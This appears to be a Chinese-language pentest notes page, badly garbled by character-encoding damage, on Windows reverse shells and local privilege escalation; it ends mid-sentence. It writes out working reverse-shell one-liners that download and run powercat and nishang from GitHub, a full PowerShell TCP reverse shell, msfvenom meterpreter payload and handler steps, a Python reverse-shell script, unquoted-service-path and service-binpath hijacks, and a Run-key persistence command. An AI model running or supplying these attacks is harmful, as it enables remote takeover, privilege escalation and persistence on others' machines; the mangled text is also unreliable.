0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);/verifyonly/font æ‰«æä½†ä¸ä¿®å¤ FTPä¼ è¾“ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);ftp/font font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);-i/font å…³é—­äº¤äº’æ¨¡å¼ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);-s:file/font æ‰§è¡ŒæŒ‡å®šæ–‡ä»¶ä¸­çš„ftpå‘½ä»¤ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);-v/font ç¦æ­¢æ˜¾ç¤ºè¿œç¨‹æœåŠ¡å™¨å“åº” æ³¨å†Œè¡¨ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);reg/font font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);query/font æŸ¥è¯¢æ³¨å†Œè¡¨é”®å€¼ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);add/font æ·»åŠ æ–°çš„æ³¨å†Œè¡¨é¡¹ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);delete/font åˆ é™¤æ³¨å†Œè¡¨é¡¹ ç”¨æˆ·è´¦æˆ· font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);net user/font font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);username /add/font æ·»åŠ ç”¨æˆ·è´¦æˆ· font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);username /delete/font åˆ é™¤ç”¨æˆ·è´¦æˆ· font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);username password/font æ›´æ”¹ç”¨æˆ·å¯†ç  è®¡åˆ’ä»»åŠ¡ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);schtasks/font font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);/create/font åˆ›å»ºæ–°è®¡åˆ’ä»»åŠ¡ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);/delete/font åˆ é™¤è®¡åˆ’ä»»åŠ¡ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);/query/font æ˜¾ç¤ºæ‰€æœ‰è®¡åˆ’ä»»åŠ¡ Windowsåå¼¹shell Win 192.168.129.161 KaLi 192.168.129.152powercat kali nc -lvp 5555 windows powershell -ExecutionPolicy Bypass -Command â€œ$content Invoke-RestMethod â€˜https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1; Invoke-Expression $content; powercat -c 192.168.129.152 -p 5555 -e cmdâ€ è§£é‡Šï¼š powershell è¿™æ˜¯è°ƒç”¨ PowerShell çš„å‘½ä»¤ã€‚åœ¨ Windows çš„å‘½ä»¤æç¤ºç¬¦ï¼ˆcmdï¼‰ä¸­ï¼Œä½ å¯ä»¥é€šè¿‡ powershell å‘½ä»¤å¯åŠ¨ PowerShell ç¯å¢ƒã€‚ 2. -ExecutionPolicy Bypassè¿™æ˜¯ä¸€ä¸ªé‡è¦çš„å‚æ•°ï¼Œç”¨äºç»•è¿‡ PowerShell çš„æ‰§è¡Œç­–ç•¥é™åˆ¶ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼ŒPowerShell ä¼šé™åˆ¶è¿è¡Œæœªç­¾åçš„è„šæœ¬ï¼Œä»¥é˜²æ­¢æ¶æ„è„šæœ¬çš„æ‰§è¡Œã€‚-ExecutionPolicy Bypass é€‰é¡¹å…è®¸ä½ ä¸´æ—¶ç»•è¿‡è¿™äº›é™åˆ¶ï¼Œåªåœ¨å½“å‰ä¼šè¯ä¸­è¿è¡ŒæŒ‡å®šçš„å‘½ä»¤ã€‚ 3. -Commandè¿™ä¸ªå‚æ•°ç”¨äºæŒ‡å®šè¦æ‰§è¡Œçš„ PowerShell å‘½ä»¤ã€‚ä½ å¯ä»¥å°†å¤šä¸ªå‘½ä»¤æ”¾åœ¨ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­ï¼Œç”¨åˆ†å· ; åˆ†éš”ã€‚è¿™äº›å‘½ä»¤å°†åœ¨åŒä¸€ä¸ª PowerShell ä¼šè¯ä¸­ä¾æ¬¡æ‰§è¡Œã€‚ 4. contentï¼šè¿™æ˜¯ä¸€ä¸ªå˜é‡ï¼Œç”¨äºå­˜å‚¨ä»ç½‘ç»œä¸‹è½½çš„å†…å®¹ã€‚Invoke-RestMethodï¼šè¿™æ˜¯ä¸€ä¸ª PowerShell å‘½ä»¤ï¼Œç”¨äºä»æŒ‡å®šçš„ URL ä¸‹è½½å†…å®¹ã€‚å®ƒä¼šè¿”å›ä¸‹è½½çš„å†…å®¹ï¼Œè€Œä¸æ˜¯ä¿å­˜åˆ°æ–‡ä»¶ã€‚â€˜https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1 â€˜ï¼šè¿™æ˜¯ powercat.ps1 è„šæœ¬çš„ GitHub åŸå§‹é“¾æ¥ã€‚Invoke-RestMethod ä¼šä»è¿™ä¸ª URL ä¸‹è½½è„šæœ¬å†…å®¹ã€‚ 5. Invoke-Expression contentï¼šè¿™æ˜¯ä¹‹å‰ä¸‹è½½çš„è„šæœ¬å†…å®¹ã€‚Invoke-Expression ä¼šå°†è¿™äº›å†…å®¹ä½œä¸º PowerShell ä»¤æ‰§è¡Œã€‚ 6. powercat -c 192.168.129.152 -p 5555 -e cmdpowercatï¼šè¿™æ˜¯ powercat.ps1 è„šæœ¬ä¸­çš„ä¸€ä¸ªå‘½ä»¤ï¼Œç”¨äºå»ºç«‹ç½‘ç»œè¿æ¥ã€‚-c 192.168.129.152ï¼šæŒ‡å®šè¦è¿æ¥çš„ç›®æ ‡ IP åœ°å€ã€‚-p 5555ï¼šæŒ‡å®šè¦è¿æ¥çš„ç›®æ ‡ç«¯å£å·ã€‚-e cmdï¼šæŒ‡å®šåœ¨å»ºç«‹è¿æ¥åæ‰§è¡Œçš„å‘½ä»¤ã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œcmd è¡¨ç¤ºå¯åŠ¨ Windows çš„å‘½ä»¤æç¤ºç¬¦ï¼ˆcmd.exeï¼‰ã€‚ nishang kali nc -lvp 5555 windows powershell -ExecutionPolicy Bypass -Command â€œIEX (New-Object Net.WebClient).DownloadString(â€˜https://raw.githubusercontent.com/samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellTcp.ps1);;) Invoke-PowerShellTcp -Reverse -IPAddress 192.168.129.152 -Port 5555â€ è§£é‡Š è‡ªå®šä¹‰powershellå‡½æ•°åå¼¹shell kali nc -lvp 5555 win powershellç‰ˆæœ¬ powershell -nop -c â€œ$client New-Object Net.Sockets.TCPClient(â€˜192.168.129.152â€™,5555);$stream $client.GetStream(); [byte[]]$bytes 0..65535|%{0};while(($i $stream.Read($bytes, 0, $bytes.Length)) -ne 0){; $data (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback (iex $data 21 | Out-String ); $sendback2 $sendback + â€˜PS â€˜ + (pwd).Path + â€˜ â€˜;$sendbyte ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()â€ **font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);powershell -nop -c/font**: **font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);powershell/font**: è°ƒç”¨ PowerShellã€‚ **font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);-nop/font**: ç®€å†™ä¸º font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);-NoProfile/fontï¼Œè¡¨ç¤ºä¸åŠ è½½ç”¨æˆ·é…ç½®æ–‡ä»¶ã€‚è¿™å¯ä»¥åŠ å¿«å¯åŠ¨é€Ÿåº¦ï¼Œå¹¶é¿å…é…ç½®æ–‡ä»¶ä¸­çš„è®¾ç½®å½±å“è„šæœ¬è¿è¡Œã€‚ **font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);-c/font**: ç®€å†™ä¸º font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);-Command/fontï¼Œè¡¨ç¤ºæ‰§è¡ŒæŒ‡å®šçš„å‘½ä»¤ã€‚ **font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);$client = New-Object Net.Sockets.TCPClient(192.168.129.152,5555)/font**: åˆ›å»ºä¸€ä¸ª font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);TCPClient/font å¯¹è±¡ï¼Œç”¨äºå»ºç«‹ TCP è¿æ¥ã€‚ **font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);192.168.129.152/font**: ç›®æ ‡æœåŠ¡å™¨çš„ IP åœ°å€ã€‚ **font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);5555/font**: ç›®æ ‡æœåŠ¡å™¨çš„ç«¯å£å·ã€‚ **font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);$stream = $client.GetStream()/font**: è·å– font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);TCPClient/font çš„ç½‘ç»œæµï¼ˆfont style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);NetworkStream/fontï¼‰ï¼Œç”¨äºè¯»å–å’Œå†™å…¥æ•°æ®ã€‚ **font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);[byte[]]$bytes = 0..65535|%{0}/font**: åˆ›å»ºä¸€ä¸ªå¤§å°ä¸º 65536 çš„å­—èŠ‚æ•°ç»„ï¼Œç”¨äºå­˜å‚¨ä»ç½‘ç»œæµä¸­è¯»å–çš„æ•°æ®ã€‚ **font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);0..65535/font**: ç”Ÿæˆä¸€ä¸ªä» 0 åˆ° 65535 çš„æ•°å­—åºåˆ—ã€‚ **font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);|%{0}/font**: å¯¹æ¯ä¸ªæ•°å­—ç”Ÿæˆä¸€ä¸ªå€¼ä¸º 0 çš„å­—èŠ‚ã€‚ **font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)/font**: ä»ç½‘ç»œæµä¸­è¯»å–æ•°æ®ï¼Œç›´åˆ°æ²¡æœ‰æ›´å¤šæ•°æ®å¯è¯»ã€‚ **font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);$stream.Read($bytes, 0, $bytes.Length)/font**: ä»ç½‘ç»œæµä¸­è¯»å–æ•°æ®åˆ° font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);$bytes/font æ•°ç»„ä¸­ï¼Œè¿”å›è¯»å–çš„å­—èŠ‚æ•°ã€‚ **font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);-ne 0/font**: æ£€æŸ¥æ˜¯å¦è¯»å–åˆ°æ•°æ®ï¼ˆå³è¿”å›å€¼ä¸ä¸º 0ï¼‰ã€‚ **font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)/font**: å°†è¯»å–çš„å­—èŠ‚è½¬æ¢ä¸ºå­—ç¬¦ä¸²ã€‚ **font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);System.Text.ASCIIEncoding/font**: ä½¿ç”¨ ASCII ç¼–ç å°†å­—èŠ‚è½¬æ¢ä¸ºå­—ç¬¦ä¸²ã€‚ **font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);$i/font**: è¯»å–çš„å­—èŠ‚æ•°ã€‚ **font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);$sendback = (iex $data 21 | Out-String )/font**: æ‰§è¡Œä»ç½‘ç»œæµä¸­è¯»å–çš„å‘½ä»¤ï¼Œå¹¶æ•è·è¾“å‡ºã€‚ **font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);iex $data/font**: ä½¿ç”¨ font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);Invoke-Expression/fontï¼ˆfont style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);iex/fontï¼‰æ‰§è¡Œ font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);$data/font ä¸­çš„å‘½ä»¤ã€‚ **font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);21/font**: å°†é”™è¯¯è¾“å‡ºé‡å®šå‘åˆ°æ ‡å‡†è¾“å‡ºã€‚ **font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);| Out-String/font**: å°†è¾“å‡ºè½¬æ¢ä¸ºå­—ç¬¦ä¸²ã€‚ **font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);$sendback2 = $sendback + PS + (pwd).Path + /font**: æ„é€ è¿”å›çš„å­—ç¬¦ä¸²ï¼ŒåŒ…æ‹¬å‘½ä»¤çš„è¾“å‡ºå’Œå½“å‰è·¯å¾„ã€‚ **font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);$sendback/font**: å‘½ä»¤çš„è¾“å‡ºã€‚ **font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);PS + (pwd).Path + /font**: å½“å‰è·¯å¾„æç¤ºç¬¦ã€‚ **font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)/font**: å°†è¿”å›çš„å­—ç¬¦ä¸²è½¬æ¢ä¸ºå­—èŠ‚æ•°ç»„ã€‚ **font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);$stream.Write($sendbyte,0,$sendbyte.Length)/font**: å°†è¿”å›çš„å­—èŠ‚å†™å›ç½‘ç»œæµã€‚ **font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);$stream.Flush()/font**: åˆ·æ–°ç½‘ç»œæµï¼Œç¡®ä¿æ‰€æœ‰æ•°æ®éƒ½å·²å‘é€ã€‚ **font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);$client.Close()/font**: å…³é—­ TCP å®¢æˆ·ç«¯ã€‚ cmdç‰ˆæœ¬ powershell -nop -c â€œ$client New-Object Net.Sockets.TCPClient(â€˜192.168.129.152â€™,5555);$stream $client.GetStream(); [byte[]]$bytes 0..65535|%{0};while(($i $stream.Read($bytes, 0, $bytes.Length)) -ne 0){; $data (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback (cmd c $data 21 | Out-String ); $sendback2 $sendback + â€˜CMD â€˜ + (pwd).Path + â€˜ â€˜;$sendbyte ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()â€ MSFåå¼¹ msfvenom -p windowsmeterpreterreverse_tcp LHOST192.168.129.152 LPORT5555 -f exe -o shell.exeï¼ˆmsf æœ¬åœ°IPï¼‰ msf6 use exploit/multi/handler[*] Using configured payload generic/shell_reverse_tcpmsf6 exploit(multi/handler) set payload windows/meterpreter/reverse_tcppayload = windows/meterpreter/reverse_tcp(show options)msf6 exploit(multi/handler) set lhost 192.168.129.152lhost = 192.168.183.142msf6 exploit(multi/handler) set lport 5555lport = 4444msf6 exploit(multi/handler) exploit[*] Started reverse TCP handler on 192.168.129.152:5555 åˆ›å»ºmeterpreterä¼šè¯å execute -H -i -f cmd.exe pythonåå¼¹shell kali nc -lvp 5555 win # -*- coding:utf-8 -*-import osimport selectimport socketimport sysimport subprocessdef ReserveConnect(addr, port): åå¼¹è¿æ¥shell try: shell = socket.socket(socket.AF_INET, socket.SOCK_STREAM) shell.connect((addr,port)) except Exception as reason: print ([-] Failed to Create Socket : %s%reason) exit(0) rlist = [shell] wlist = [] elist = [shell] while True: shell.send(cmd:.encode()) rs,ws,es = select.select(rlist,wlist,wlist) for sockfd in rs: if sockfd == shell: command = shell.recv(1024) if command == exit: shell.close() break result, error = subprocess.Popen(command,shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE).communicate() shell.sendall(result.decode(GB2312).encode(UTF-8))# ä¸»å‡½æ•°è¿è¡Œdef run(): if len(sys.argv)3: print(Usage: python reverse.py [IP] [PORT]) else: url = sys.argv[1] port = int(sys.argv[2]) ReserveConnect(url,port)if __name__ == __main__: run() - æ‰§è¡Œpython reverse_win.py 127.0.0.1 5555 Windows å†…æ ¸æº¢å‡ºæ¼æ´ä¸€ï¼šæ‰‹å·¥ systeminfo python wes.py sys.txt https://github.com/bitsadmin/wesng æŸ¥æ‰¾å†…æ ¸ææƒexp https://github.com/k8gege/Ladon https://github.com/Ascotbe/KernelHub https://github.com/nomi-sec/PoC-in-GitHub https://github.com/offensive-security/exploitdb http://cve.mitre.org/data/refs/refmap/source-MS.html äºŒ:msfè‡ªåŠ¨(åå¼¹shellå) postwindowsgatherenum_patches(åŠè‡ªåŠ¨ï¼Œè¿˜å¾—è‡ªå·±æ‰¾,æ‰¾å‡ºç³»ç»Ÿä¸­ç¼ºå°‘çš„è¡¥ä¸) bg use postwindowsgatherenum_patches set session 1 run postmultireconlocal_exploit_suggester(å…¨è‡ªåŠ¨) bg use postmultireconlocal_exploit_suggester. set session 1 run æ‰¾åˆ°ç»¿è‰²çš„ï¼Œå¯ç”¨çš„,ä¸€ä¸ªä¸€ä¸ªè¯• ç”¨ç¬¬ä¸€ä¸ªè¯•è¯• use exploitwindowslocalalways_install_elevated set session 1 æ¢ä¸€ä¸ªä¸ä¸€æ ·çš„ç«¯å£ï¼Œç„¶åï¼Œå¦å¤–æ‰“å¼€ä¸€ä¸ªmsf,ç›‘å¬è¿™ä¸ªç«¯å£ é”™è¯¯çš„ç³»ç»Ÿé…ç½®ææƒ1.ä¸å®‰å…¨çš„æœåŠ¡æƒé™æŸ¥è¯¢æœåŠ¡çš„é…ç½®ï¼š sc.exe qc name æŸ¥è¯¢æœåŠ¡çš„å½“å‰çŠ¶æ€ï¼š sc.exe query name ä¿®æ”¹æœåŠ¡çš„é…ç½®é€‰é¡¹ï¼š sc.exe config name option= value å¼€å§‹åœæ­¢æœåŠ¡ï¼š net start/stop name accesschk.exeç”¨æ³•ä»‹ç» å‘½ä»¤ æŸ¥çœ‹ç”¨æˆ·ç”¨æˆ·ç»„å¯¹æ–‡ä»¶æ–‡ä»¶å¤¹çš„æƒé™ accesschk ç”¨æˆ·ç”¨æˆ·ç»„æ–‡ä»¶ä»¶å¤¹ åˆ—å‡ºæ‰€æœ‰æœåŠ¡çš„æƒé™ accesschk.exe -ucqv * æŸ¥çœ‹ç”¨æˆ·ç”¨æˆ·ç»„å…·æœ‰å†™æƒé™çš„æœåŠ¡ accesschkç”¨æˆ·ç”¨æˆ·ç»„ -cw * è¦æŸ¥çœ‹ç”¨æˆ·ç”¨æˆ·ç»„å¯¹ HKEY LOCAL MACHINEã€Softwareç›®å½•ä¸‹æ³¨å†Œè¡¨é¡¹çš„æƒé™ accesschk-kç”¨æˆ·ç”¨æˆ·ç»„ hkl\\software æŸ¥çœ‹æ¯ä¸ªäººéƒ½å¯ä»¥ä¿®æ”¹çš„å…¨å±€å¯¹è±¡ accesschk -wuo everyone font - åå¼¹shell - ç”¨winPEASany.exe æ£€æŸ¥font style=color:rgb(36, 41, 47);æœåŠ¡é…ç½®é”™è¯¯ .\\winPEASany.exe quiet servicesinfo/font - font style=color:rgb(36, 41, 47);æŸ¥çœ‹æ˜¯å¦æœ‰æ‰‹å·¥ä¿®æ”¹çš„æœåŠ¡/font - font style=color:rgb(36, 41, 47);.\\accesschk.exe /accepteula -uwcqv user æœåŠ¡/font - font style=color:rgb(36, 41, 47);æ£€æŸ¥ç”¨æˆ·æˆ–ç»„æ˜¯å¦æœ‰æƒè®¿é—®æ–‡ä»¶ï¼Œç›®å½•ï¼ŒæœåŠ¡å’Œæ³¨å†Œè¡¨é¡¹/font - font style=color:rgb(36, 41, 47);sc qc æœåŠ¡ /font - font style=color:rgb(36, 41, 47);æ£€æŸ¥å½“å‰é…ç½®/font - font style=color:rgb(36, 41, 47);sc config /fontfont style=color:rgb(36, 41, 47);æœåŠ¡/fontfont style=color:rgb(36, 41, 47); binpath= \\C:\\Users\\user\\Desktop\\a002.exe\\ /font - font style=color:rgb(36, 41, 47);é‡æ–°é…ç½®æœåŠ¡ä½¿æˆ‘ä»¬åå‘shell/font - font style=color:rgb(36, 41, 47);net start /fontfont style=color:rgb(36, 41, 47);æœåŠ¡/font - font style=color:rgb(36, 41, 47);å¯åŠ¨æœåŠ¡è§¦å‘æ¼æ´åå¼¹shell/font 2.æœªå¼•ç”¨çš„æœåŠ¡è·¯å¾„1.è¿è¡ŒwinPEASä»¥æ£€æŸ¥æœåŠ¡é…ç½®é”™è¯¯ï¼š.\\winPEASany.exe quiet servicesinfo 2. å‘ç°â€unquotedsvcâ€æœåŠ¡æœ‰ä¸€ä¸ªæœªå¼•ç”¨çš„è·¯å¾„ ï¼Œå…¶ä¸­ä¹Ÿ åŒ…å« ç©ºæ ¼ï¼šC:\\Program Files\\Unquoted Path Service\\Common Files\\unquotedpathservice.exe 3. ä½¿ç”¨scç¡®è®¤æ­¤é—®é¢˜ï¼šsc qc unquotedsvc 4.ä½¿ç”¨accesschk.exeæ£€æŸ¥å†™å…¥æƒé™ï¼š.\\accesschk.exe /accepteula -uwdq C:\\ .\\accesschk.exe /accepteula -uwdq C:\\Program Files\\ .\\accesschk.exe /accepteula -uwdq C:\\Program Files\\Unquoted Path Service\\ 1. .\\accesschk.exe /accepteula -uwdq C:\\**åŠŸèƒ½ åŠŸèƒ½ï¼šæ‰«æ C ç›˜æ ¹ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶å’Œæ–‡ä»¶å¤¹å‚æ•°å«ä¹‰ï¼š/accepteulaï¼šè‡ªåŠ¨æ¥å—æœ€ç»ˆç”¨æˆ·è®¸å¯åè®®-uï¼šåªæ˜¾ç¤ºå½“å‰ç”¨æˆ·çš„æƒé™-wï¼šåªæ˜¾ç¤ºæœ‰å†™å…¥æƒé™çš„é¡¹ç›®-dï¼šæ˜¾ç¤ºç›®å½•æƒé™-qï¼šé™é»˜æ¨¡å¼ï¼Œä¸æ˜¾ç¤ºæ¨ªå¹…2. .\\accesschk.exe /accepteula -uwdq C:\\Program Files\\åŠŸèƒ½ï¼šæ‰«æ Program Files ç›®å½•åŠå…¶å­ç›®å½•ç›®çš„ï¼šæ‰¾å‡ºå½“å‰ç”¨æˆ·åœ¨ Program Files ä¸­æœ‰å†™å…¥æƒé™çš„ä½ç½®3. .\\accesschk.exe /accepteula -uwdq C:\\Program Files\\Unquoted Path Service\\åŠŸèƒ½ï¼šä¸“é—¨æ‰«æç‰¹å®šæœåŠ¡ç›®å½•ç‰¹ç‚¹ï¼šè¿™æ˜¯ä¸€ä¸ªå…¸å‹çš„æœªåŠ å¼•å·çš„æœåŠ¡è·¯å¾„ç¤ºä¾‹ 5.å¤åˆ¶å¯æ‰§è¡Œçš„åå‘å¤–å£³å¹¶é€‚å½“é‡å‘½åcopy C:\\Users\\user\\Desktop\\a002.exe C:\\Program Files\\Unquoted Path Service\\Common.exe ç³»ç»Ÿä¼šæŒ‰ä»¥ä¸‹é¡ºåºæŸ¥æ‰¾å¯æ‰§è¡Œæ–‡ä»¶ï¼šC:\\Program.exeC:\\Program Files\\Unquoted.exeC:\\Program Files\\Unquoted Path.exeC:\\Program Files\\Unquoted Path Service\\Common.exe 6.å¯åŠ¨æœåŠ¡è§¦å‘æ¼æ´è¿›è¡Œåå¼¹shellnet start unquotedsvc 3.æ³¨å†Œè¡¨æƒé™å¼± ç”±äºæ³¨å†Œè¡¨æ¡ç›®å¯èƒ½å…·æœ‰ ACLï¼Œå¦‚æœ ACL é…ç½®é”™è¯¯ï¼Œå³ä½¿æˆ‘ä»¬ä¸èƒ½ç›´æ¥ä¿®æ”¹æœåŠ¡ï¼Œä¹Ÿæœ‰å¯èƒ½ä¿®æ”¹æœåŠ¡çš„é…ç½® 4.ä¸å®‰å…¨çš„æœåŠ¡å¯æ‰§è¡Œ5.msfæ”»å‡»æ¨¡å—éœ€è¦æå‰è·å–ä¸€ä¸ªsession exploitwindowslocalservice_permissions exploitwindowslocalunquoted_service_path æ³¨å†Œè¡¨Windows æ³¨å†Œè¡¨æ˜¯ä¸€ä¸ªåºå¤§çš„é…ç½®æ•°æ®åº“ï¼Œå­˜å‚¨äº†ç³»ç»Ÿå’Œåº”ç”¨ç¨‹åºçš„é…ç½®ä¿¡æ¯ã€‚ç”±äºå…¶é‡è¦æ€§ï¼Œæ³¨å†Œè¡¨ä¸­çš„æ¼æ´ç»å¸¸æˆä¸ºæ”»å‡»è€…çš„ç›®æ ‡ã€‚HKEY_CLASSES_ROOTï¼ˆHKCRï¼‰ï¼šå­˜å‚¨æ–‡ä»¶ç±»å‹å…³è”ã€COM å¯¹è±¡ç­‰ä¿¡æ¯ï¼Œç”¨äºå†³å®šç³»ç»Ÿå¦‚ä½•å¤„ç†ä¸åŒç±»å‹çš„æ–‡ä»¶ã€‚ä¾‹å¦‚ï¼Œå½“åŒå‡»ä¸€ä¸ª.docx æ–‡ä»¶æ—¶ï¼Œç³»ç»Ÿä¼šä¾æ®æ­¤åˆ†æ”¯ä¸­çš„ä¿¡æ¯è°ƒç”¨ç›¸åº”çš„ç¨‹åºï¼ˆå¦‚ Wordï¼‰æ¥æ‰“å¼€å®ƒã€‚ HKEY_CURRENT_USERï¼ˆHKCUï¼‰ï¼šåŒ…å«å½“å‰ç™»å½•ç”¨æˆ·çš„ä¸ªæ€§åŒ–è®¾ç½®ï¼Œå¦‚æ¡Œé¢å¸ƒå±€ã€æµè§ˆå™¨ä¹¦ç­¾ã€åº”ç”¨ç¨‹åºåå¥½è®¾ç½®ç­‰ã€‚æ¯ä¸ªç”¨æˆ·ç™»å½•æ—¶ï¼Œç³»ç»Ÿä¼šåŠ è½½å±äºè¯¥ç”¨æˆ·çš„æ­¤åˆ†æ”¯æ•°æ®ã€‚ HKEY_LOCAL_MACHINEï¼ˆHKLMï¼‰ï¼šå­˜å‚¨ä¸æœ¬åœ°è®¡ç®—æœºç›¸å…³çš„ç³»ç»Ÿè®¾ç½®ï¼Œè¿™äº›è®¾ç½®å¯¹æ‰€æœ‰ç”¨æˆ·éƒ½ç”Ÿæ•ˆï¼ŒåŒ…æ‹¬ç¡¬ä»¶é…ç½®ã€è½¯ä»¶å®‰è£…ä¿¡æ¯ã€ç³»ç»ŸæœåŠ¡é…ç½®ç­‰ã€‚ä¾‹å¦‚ï¼Œå®‰è£…çš„æ‰“å°æœºé©±åŠ¨ç¨‹åºä¿¡æ¯å°±å­˜å‚¨åœ¨æ­¤åˆ†æ”¯ã€‚ HKEY_USERSï¼šåŒ…å«æ‰€æœ‰å·²ç™»å½•ç”¨æˆ·çš„é…ç½®æ–‡ä»¶ï¼ŒHKCU å®é™…ä¸Šæ˜¯ HKEY_USERS ä¸‹å¯¹åº”å½“å‰ç™»å½•ç”¨æˆ·çš„å­é”®çš„æ˜ å°„ã€‚ HKEY_CURRENT_CONFIGï¼ˆHKCCï¼‰ï¼šå­˜å‚¨å½“å‰ç¡¬ä»¶é…ç½®æ–‡ä»¶çš„ç›¸å…³ä¿¡æ¯ï¼Œè¿™äº›ä¿¡æ¯æ˜¯ç³»ç»Ÿåœ¨å¯åŠ¨æ—¶æ ¹æ®ç¡¬ä»¶è®¾å¤‡æƒ…å†µåŠ¨æ€ç”Ÿæˆçš„ã€‚ 1 è‡ªå¯åŠ¨é¡¹Windows å¯åŠ¨æ—¶ä¼šè‡ªåŠ¨è¿è¡ŒæŸäº›æ³¨å†Œè¡¨é¡¹ä¸­çš„ç¨‹åºã€‚æ”»å‡»è€…å¯ä»¥æ·»åŠ æˆ–ä¿®æ”¹è¿™äº›é¡¹ï¼Œä»¥ä¾¿åœ¨ç³»ç»Ÿå¯åŠ¨æ—¶æ‰§è¡Œæ¶æ„ä»£ç ã€‚ ç¤ºä¾‹ï¼š reg add â€œHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Runâ€ v â€œMaliciousâ€ t REG_SZ d â€œC:\\malicious.exeâ€ f 2 æœåŠ¡é…ç½®ä¸­çš„ ImagePathæŸäº›æœåŠ¡çš„å¯æ‰§è¡Œæ–‡ä»¶è·¯å¾„å­˜å‚¨åœ¨æ³¨å†Œè¡¨ä¸­ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡ä¿®æ”¹è¿™äº›è·¯å¾„æ¥æ‰§è¡Œæ¶æ„ä»£ç ã€‚ ç¤ºä¾‹ï¼š reg add 